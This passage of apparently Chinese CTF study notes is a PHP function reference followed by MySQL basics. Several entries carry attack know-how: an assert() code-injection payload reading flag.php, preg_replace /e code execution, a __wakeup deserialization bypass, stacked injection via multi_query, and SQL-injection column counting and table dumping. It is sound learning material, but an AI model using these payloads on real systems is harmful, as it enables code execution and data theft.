href="#变量套函数" class="headerlink" title="变量套函数"></a>变量套函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showstr</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">showstr();</span><br><span class="line"><span class="comment">//正常的调用方法</span></span><br><span class="line"><span class="variable">$action</span> = <span class="string">&quot;showstr&quot;</span>;</span><br><span class="line"><span class="variable">$action</span>();<span class="comment">//实际调用了showstr()函数</span></span><br></pre></td></tr></table></figure><hr><h1 id="PHP-func-DICT"><a href="#PHP-func-DICT" class="headerlink" title="PHP func DICT"></a><big><center>PHP <i>func</i> DICT</center></big></h1><p><code>error_reporting(0)</code>    # 关闭错误报告</p><p><code>print()</code>/<code>print_r()</code>/<code>echo</code>    # echo更像是如 if，while这样的语言结构，没有返回值，且可以直接打印多个变量；print()与 print_r()是函数，存在返回值 true；其中 print_r()相比 print()可以传入的变量范围更大，数组也可以用 print_r()打印出来</p><p><code>var_dump($var)</code>    # 展示$var的value与type</p><p><code>eval($str)</code>    # 执行参数中包含的PHP代码</p><p><code>assert($str)</code>    # 断言，可以看作异常处理的一种高级形式，用于调试代码，重点在于assert函数会将传入的 str类型参数全部当成 PHP代码执行，与 eval类似。但根据测试，assert的代码不能有空格，也不能输入多个语句</p><ul><li><p>assert的闭合 // 理论上如此，待测试</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//POST：myString=&#x27;&#x27;) or print_r(file_get_content(flag.php));#</span></span><br><span class="line">assert(<span class="variable">$_POST</span>[<span class="string">&#x27;myString&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;holyShit&quot;</span>);</span><br><span class="line"><span class="comment">//最终会执行的是：</span></span><br><span class="line">assert(<span class="string">&#x27;&#x27;</span>) <span class="keyword">or</span> print_r(file_get_content(flag.php));<span class="comment">#) or die(&quot;holyShit&quot;);</span></span><br></pre></td></tr></table></figure></li></ul><p><code>scandir($str)</code>    # 扫描指定目录下的文件，返回值为文件名组成的数组</p><p><code>die(str)</code>与<code>exit(str)</code>    # 退出当前脚本并弹出 status状态描述，其中比较有趣的是or die()这种组合。因 PHP并不区分数据类型，所以$file既可以是int也可以bool，所以这样的语句不会报错，在大多数的语言中，bool or bool这样的语句中，若前一个值为真后一个值就不再判断了。例如下列代码，如果 fopen函数执行正确的话，会返回一个大于0的int值（文件指针资源，这其实就是true），后面的语句就不会执行了，而失败时返回false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;抱歉，无法打开: <span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="literal">true</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no1&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no.1 passed&quot;</span>;</span><br><span class="line"><span class="literal">false</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no2&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no.2 passed&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>no.1 passed<br>no2</blockquote><p><code>system(shell command)</code>    # 执行shell命令</p><p><code>file_get_contents($stream)</code>    # 将数据流读入字符串，若php://input作为参数，就可以将用户输入读成字符串</p><p><code>file($stream)</code>    # 将数据流读入数组，每行作一个元素</p><p><code>highlight_file($filename,$return)</code>    # 对文件进行语法高亮输出，$return参数可选，默认为false；当为true时返回字符串而不输出</p><p><code>extract($array)</code>    # 输入一个数组，将数组中的元素解析到对应的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>$a = 3; $b = Dog; $c = Horse</blockquote><p><code>eregi($str1,$str2)</code>与<code>ereg($str1,$str2)</code>    # 在 str2中搜索 str1中的字符，存在时返回 true，这两个函数完全相同，除了前者忽略大小写，后者不忽略大小写，当第一个字段为空 (NULL)时，就绕过了此函数 // 这两个函数都是 PHP4，PHP5才有，较为远古</p><p><code>trim($str1, $str2)</code>    # 当只填一个参数时，trim函数返回去除字符串两侧的空白字符后的结果；当填了第二个参数后，trim函数返回 $str1两端去除 $str2指定的字符后的结果</p><p><code>strstr($str1,$str2)</code>与<code>stristr(\$str1,\$str2)</code>    # 查找$str2在$str1中第一次出现的地方，并返回剩余部分，如$str1=”abcde”，$str2=”cd”，则返回 “cde”。前者严格比较大小写，可用更改大小写检查网页是否使用strstr()进行过滤；后者对大小写不敏感</p><p><code>substr($str,$int1,$int2)</code>    # 返回$str中第$int1个字符开始，的$int2个字符组成的字符串，当$int2不设置时返回第$int1个字符后的全部字符</p><p><code>strcmp($str1, $str2)</code>    # 比较两个字符串，当两个字符串相等，返回 0，前者大于后者返回 1，后者大于前者返回 -1，字符串的大小根据自然排序比较，大概就跟着感觉走的意思 …</p><p><code>str_replace($str1,$str2,$str3)</code>    # 把$str3中存在的所有$str1替换为$str2</p><p><code>stripos($str1,$str2)</code>    # 查找 str2在 str1中第一次出现的位置，返回 int</p><p><code>parse_str($str)</code>    # 把查询字符串解析到变量中，如parse_str(“name=Bill&amp;age=60”); 则现在有了两个变量$name=Bill 和$age=60</p><p><code>str_split($str,$len)</code>    # 把字符串分割到数组中，按长度分割，$len默认为1，看个例子就明白了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(str_split(<span class="string">&quot;S hangh ai&quot;</span>,<span class="number">3</span>));</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>    &emsp;[0] => S h<br>    &emsp;[1] => ang<br>    &emsp;[2] => h a<br>    &emsp;[3] => i<br>)</blockquote><p><code>explode($str1,$str2)</code>    # $str1作为分隔符，以此将字符串打散为数组，看个例子就明白了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World, I love You&quot;</span>;</span><br><span class="line">print_r (explode(<span class="string">&quot; &quot;</span>,<span class="variable">$str</span>));<span class="comment">//空格作为分隔符</span></span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>&emsp;[0] => Hello<br>&emsp;[1] => world.<br>&emsp;[2] => I<br>&emsp;[3] => love<br>&emsp;[4] => Shanghai!<br>)</blockquote><p><code>preg_replace($pattern, $replacement, $subject)</code>    # 其中 {$pattern为正则表达式，$replacement为替换字符串，$subject 为要搜索替换的目标字符串或字符串数组} 。这个函数正则表达式$pattern以“/e”结尾时$replacement的值会被作为PHP函数执行，例如执行preg_replace (‘/test/e’ , “phpinfo();” , “test”)，“test”会被替换为 phpinfo();并执行</p><p><code>preg_match($pattern, $str, $matches)</code>    # 其中 $pattern为正则表达式，$str为被搜索的目标字符串，若提供了参数 $matches，则会在匹配到后被返回，且附加在字符串中的 index，示例如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/(foo)(bar)(baz)/&#x27;</span>, <span class="string">&#x27;foobarbaz&#x27;</span>, <span class="variable">$matches</span>, PREG_OFFSET_CAPTURE);</span><br><span class="line">print_r(<span class="variable">$matches</span>);</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>&emsp;[0] => Array(<br>&emsp;&emsp;[0] => foobarbaz<br>&emsp;&emsp;[1] => 0<br>&emsp;)<br>&emsp;[1] => Array(<br>&emsp;&emsp;[0] => foo<br>&emsp;&emsp;[1] => 0<br>&emsp;)<br>&emsp;[2] => Array(<br>&emsp;&emsp;[0] => bar<br>&emsp;&emsp;[1] => 3)<br>&emsp;[3] => Array(<br>&emsp;&emsp;[0] => baz<br>&emsp;&emsp;[1] => 6<br>&emsp;)<br>)</blockquote><p><code>serialize()</code>与<code>unserialize()</code>    # 序列化与反序列化，互为反函数，只需了解序列化即可，简单来说就是把变量转为 string，保留关于原本数据类型的信息，序列化的存在意义在于使一切变量的传输无异于字符串传输；但需要注意的是private变量名前会有%00包裹类名占位</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kyriota</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;male&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">25</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weight</span>=<span class="number">60.5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$LoveCTF</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thingsDoentLike</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$tags</span>=<span class="keyword">array</span>(<span class="string">&quot;Steam&quot;</span>,<span class="number">1990</span>,<span class="string">&quot;Aperture&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Kyriota()),<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]//原本无换行符与任何空格，为了可读性而手动添加<br>O:7:"Kyriota":6:{<br>&emsp;s:3:"sex";s:4:"male";<br>&emsp;s:3:"age";i:25;<br>&emsp;s:6:"weight";d:60.5;<br>&emsp;s:7:"LoveCTF";b:1;<br>&emsp;s:15:"thingsDoentLike";N;<br>&emsp;s:13:"%00Kyriota%00tags";a:3:{<br>&emsp;&emsp;i:0;s:5:"Steam";<br>&emsp;&emsp;i:1;i:1990;<br>&emsp;&emsp;i:2;s:8:"Aperture";<br>&emsp;}<br>}</blockquote><ul><li><p><code>__wakeup()</code>与<code>__sleep()</code>    # 在 serialize()的时候先执行__sleep()，对数据预处理；在 unserialize()执行的时候先执行__wakeup()，对数据再处理。函数命名非常形象，序列化后变量与对象不再被解析，称其为sleep与wakeup非常合适</p></li><li><p>__wakeup()绕过：当序列化字符串表示的对象属性个数大于真是个数时就会跳过 __wakeup()执行，例如下面是一正常序列化后的文本，而当3被篡改为任何大于3的数后，反序列化时将不执行__wakeup()：</p><center><code>O:7:”Student”:3:&#123;s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:&#123;&#125;&#125;</code></center></li><li><p><code>__construct()</code>与<code>__destruct()</code>    # 在创建对象时construct，在对象销毁时destruct</p></li></ul><p>一个程序即可解释序列化以及上述相关函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__construct~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__destrcut~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__sleep~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=serialize(<span class="keyword">new</span> User(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;psswd&#x27;</span>));</span><br><span class="line"><span class="variable">$s_edited</span>=<span class="string">&#x27;O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;psswd&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">unserialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;↑↑↑unserialized with wakeup and destruct&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$s_edited</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;↑↑↑unserialized, only destruct whithout wakeup above this one&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>__construct~<br>__sleep~<br>__destrcut~<br>O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"psswd";}<br>__wakeup~<br>__destrcut~<br>↑↑↑unserialized with wakeup and destruct<br>__destrcut~<br>bool(false)<br>↑↑↑unserialized, only destruct whithout wakeup above this one<br><br>PHP Notice:  unserialize(): Unexpected end of serialized data on line 27<br>PHP Notice:  unserialize(): Error at offset 68 of 69 bytes on line 27</blockquote><code>mysql</code>与<code>mysqli</code>    # mysql连接：每当第二次使用的时候，都会重新打开一个新的进程；mysqli连接：一直都只使用同一个进程<p><code>mysql_query($query)</code>    # 查询单条语句，不需要查询语句以分号结束</p><p><code>multi_query($query)</code>    # 查询多条语句，语句间以分号分隔，结尾不需要分号，当添加分号发现是以<code>multi_query()</code>查询的时候，可以进行堆叠注入，追加任何mysql查询语句</p><p><code>mysql_fetch_xxx</code>    # 这种类型的函数都是从结果集中取出一行</p><table><thead><tr><th>func</th><th>return</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_array.asp">mysql_fetch_array()</a></td><td>从结果集中取得一行作为关联数组，或数字数组，或二者兼有</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_assoc.asp">mysql_fetch_assoc()</a></td><td>从结果集中取得一行作为关联数组</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_field.asp">mysql_fetch_field()</a></td><td>从结果集中取得列信息并作为对象返回</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_lengths.asp">mysql_fetch_lengths()</a></td><td>取得结果集中每个字段的内容的长度</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_object.asp">mysql_fetch_object()</a></td><td>从结果集中取得一行作为对象</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_row.asp">mysql_fetch_row()</a></td><td>从结果集中取得一行作为数字数组</td></tr></tbody></table><hr><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a><big><center>SQL</center></big></h1><h2 id="MySQL基础命令"><a href="#MySQL基础命令" class="headerlink" title="MySQL基础命令"></a><big>MySQL基础命令</big></h2><ul><li><p>通过命令行输入 mysql -u root -p，然后输入密码即可登录</p><ul><li>若报错，可能是 mysql 服务未启动，也可能是需要管理员权限的 cmd</li></ul></li><li><p>SHOW DATABASES; #查看当前数据库</p></li><li><p>SHOW TABLES; #查看当前数据库中的所有数据表名称</p></li><li><p>DESCRIBE table; #查看数据表结构，如参数名及数据类型</p><ul><li>SHOW COLUMNS FROM table1,table2…; #和上面的DESCRIBE一样，只是这可以同时选择多个表</li></ul></li><li><p>USE database; #进入某一数据库下进行操作</p></li><li><p>CREATE DATABASE database; #新建数据库</p></li><li><p>CREATE TABLE table(row1 type1,row2 type2…); #在进入某一数据库的前提下新建数据表</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Person (Name varchar(25),Address varchar(80),Age int(11)) </span><br></pre></td></tr></table></figure></li><li><p>INSERT INTO table VALUES(value1, value2, …); #向数据表加入数据</p></li><li><p>DELETE FROM table WHERE condition; #删除符合condition的数据</p></li><li><p>ALTER TABLE table DROP column; #删除列</p></li><li><p>UPDATE table SET col.1=value.1 WHERE col.2=value.2; #修改数据，col.1=value.1为赋值语句，col.2=value.2为查找项</p></li><li><p>SELECT：用于查询数据，虽直译为‘选择’，但我认为其与var_dump类似</p><ul><li><p><a href="dev.mysql.com/doc/refman/8.0/en/handler.html">HANDLER</a>：MySQL的专用查询语句，提供通往表的直接通道的存储引擎接口</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLER users OPEN;</span><br><span class="line">HANDLER user READ NEXT;</span><br><span class="line">HANDLER user CLOSE;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>show warnings; #显示错误信息.</p></li><li><p>注释符：“#”与  “– ”(两个减号后面带一个空格)，注意GET方法传参需要先url编码；以及区域注释符/*注释内容*/</p></li></ul><p>注意：当数字型字符或MySQL关键字作为字段、表、库名查询时，应该用反单引号括起来，如 SELECT * FROM &#96;2333&#96; WHERE &#96;from&#96;=&#96;8080&#96;;其中的2333作为表名，from作为字段名，8080作为字段内容 </p><h2 id="MySQL-DICT"><a href="#MySQL-DICT" class="headerlink" title="MySQL DICT"></a><big>MySQL DICT</big></h2><ul><li><p><code>UNION</code>：用于合并两个或多个 SELECT语句的结果集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">select uname,passwd from users</span><br><span class="line">union</span><br><span class="line">select &#39;Union&#39;,233;</span><br><span class="line">        #+----------+-------------+</span><br><span class="line">        #| uname    | passwd      |</span><br><span class="line">        #+----------+-------------+</span><br><span class="line">        #| Kyriota  | kyriotayyds |</span><br><span class="line">        #| 0test    | 0test       |</span><br><span class="line">        #| 233test  | 233test     |</span><br><span class="line">        #| admin    | adpasswd    |</span><br><span class="line">        #| Dr.Who   | Doctor      |</span><br><span class="line">        #| Union    | 233         |</span><br><span class="line">        #+----------+-------------+</span><br></pre></td></tr></table></figure></li><li><p><code>ORDER BY col</code>：以某一列来升序排列，需要降序排列时加上DESC即可，通常通过附加此函数验证数据表有多少列，因为用int表示根据第几个column排序时，超过实际存在的列数会报错</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 2;#此处的2即为passwd列</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| uname   | passwd      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| 0test   | 0test       |</span><br><span class="line">        #| 233test | 233test     |</span><br><span class="line">        #| admin   | adpasswd    |</span><br><span class="line">        #| Dr.Who  | Doctor      |</span><br><span class="line">        #| Kyriota | kyriotayyds |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">mysql&gt; select * from users order by 3;</span><br><span class="line">        #ERROR 1054 (42S22): Unknown column &#39;3&#39; in &#39;order clause&#39;</span><br></pre></td></tr></table></figure></li><li><p><code>CONCAT(col1,col2,col3...)</code>：将多个字符串连接成一个字符串</p></li><li><p><code>CONCAT_WS(sep_str,col1,col,col3...)</code>：可以指定分隔符的连接字符串函数</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#39;-&#39;,uname,passwd) from users;</span><br><span class="line">        #+-----------------------------+</span><br><span class="line">        #| concat_ws(&#39;-&#39;,uname,passwd) |</span><br><span class="line">        #+-----------------------------+</span><br><span class="line">        #| Kyriota-kyriotayyds         |</span><br><span class="line">        #| 0test-0test                 |</span><br><span class="line">        #| 233test-233test             |</span><br><span class="line">        #| admin-adpasswd              |</span><br><span class="line">        #| Dr.Who-Doctor               |</span><br><span class="line">        #+-----------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>GROUP_CONCAT(col SEPARATOR 'sep') FROM table GROUP BY col</code>：指定分隔符与分类方式，当不填写分类方式则全部分为一类，这可以方便爆表</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| uname   | passwd      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| Kyriota | kyriotayyds |</span><br><span class="line">        #| 0test   | 0test       |</span><br><span class="line">        #| 233test | 233test     |</span><br><span class="line">        #| admin   | adpasswd    |</span><br><span class="line">        #| Dr.Who  | Doctor      |</span><br><span class="line">        #| Dr.What | Doctor      |</span><br><span class="line">        #| Dr.How  | Doctor      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">select group_concat(uname separator &#39; , &#39;) from users group by passwd;</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">        #| group_concat(uname separator &#39; , &#39;) |</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">        #| 0test                               |</span><br><span class="line">        #| 233test                             |</span><br><span class="line">        #| admin                               |</span><br><span class="line">        #| Dr.Who , Dr.What , Dr.How           |</span><br><span class="line">        #| Kyriota                             |</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">select group_concat(uname separator &#39;-&#39;) from users;</span><br><span class="line">        #+---------------------------------------------------+</span><br><span class="line">        #| group_concat(uname separator &#39;-&#39;)                 |</span><br><span class="line">        #+---------------------------------------------------+</span><br><span class="line">        #| Kyriota-0test-233test-admin-Dr.Who-Dr.What-Dr.How |</span><br><span class="line">        #+---------------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SELECT DISTINCT</code>：去除重复的数据再返回</p></li><li><p><code>WHERE</code>：</p><ul><li><code><></code>：不等于，如 id&lt;&gt;4</li><li><code>BETWEEN ... AND ...</code>：在某范围内， 如 id BETWEEN 4 AND 8</li><li><code>LIKE</code>：模糊匹配，如 LIKE ‘A%’ 则表示筛选出 A开头的，%可以代替一个或多个字符</li><li><code>IN ( )</code>：只匹配与括号中对应的内容，如 WHERE name IN (‘admin’, ‘guest’)</li><li>NULL：找NULL时不能WHERE col=NULL，应该是WHERE col IS NULL</li></ul></li><li><p><code>AND / OR / NOT</code>：</p><ul><li><code>AND</code>：<code>WHERE Country='China' AND City='BeiJing'</code></li><li><code>OR</code>：<code>WHERE City='ShangHai' OR City='BeiJing'</code></li><li><code>NOT</code>：<code>WHERE NOT Country='China'</code></li></ul></li><li><p><code>CASE WHEN condition THEN statement ... END</code>：和大多数的case语句一样，但注意它相对于IF() ※ 不需要逗号与括号 ※</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select *,case when mark &gt;&#x3D;90 then &#39;A&#39; when mark &gt;&#x3D;60 then &#39;B&#39; else &#39;C&#39; end as level from grades order by mark desc;</span><br><span class="line">        #+------+------+-------+</span><br><span class="line">        #| Name | mark | level |</span><br><span class="line">        #+------+------+-------+</span><br><span class="line">        #| Tom  |   95 | A     |</span><br><span class="line">        #| Jill |   92 | A     |</span><br><span class="line">        #| Alan |   76 | B     |</span><br><span class="line">        #| Neo  |   59 | C     |</span><br><span class="line">        #+------+------+-------+</span><br></pre></td></tr></table></figure></li><li><p><code>IF(exp1,exp2,exp3)</code>：若exp1，则exp2，否则exp3</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select *,if(mark&gt;&#x3D;60, &#39;PASS&#39;, &#39;NOPE&#39;) from grades;</span><br><span class="line">        #+------+------+------------------------------+</span><br><span class="line">        #| Name | mark | if(mark&gt;&#x3D;60, &#39;PASS&#39;, &#39;NOPE&#39;) |</span><br><span class="line">        #+------+------+------------------------------+</span><br><span class="line">        #| Tom  |   95 | PASS                         |</span><br><span class="line">        #| Jill |   92 | PASS                         |</span><br><span class="line">        #| Neo  |   59 | NOPE                         |</span><br><span class="line">        #| Alan |   76 | PASS                         |</span><br><span class="line">        #+------+------+------------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SUBSTR / MID(str,start,length)</code>：start为起点；length为截取长度，length可选择不填</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select substr(passwd,1,3) from users;</span><br><span class="line">        #+--------------------+</span><br><span class="line">        #| substr(passwd,1,3) |</span><br><span class="line">        #+--------------------+</span><br><span class="line">        #| kyr                |</span><br><span class="line">        #| 0te                |</span><br><span class="line">        #| 233                |</span><br><span class="line">        #| adp                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #+--------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SUBSTR / MID((col)from(start))</code>：这种表达很关键的一点在于 ※ 不需要逗号 ※</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 